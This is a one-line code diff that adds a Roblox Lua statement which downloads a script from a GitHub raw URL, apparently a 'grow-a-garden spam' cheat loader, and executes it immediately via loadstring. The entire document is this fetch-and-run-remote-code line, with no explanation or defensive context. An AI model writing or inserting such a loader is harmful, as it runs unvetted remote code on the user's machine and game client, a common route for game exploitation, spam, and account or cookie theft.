@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestBaseDuel/loaders/main/loaders/grow-a-garden-spam1-411z7tdejol0t4.lua"))()
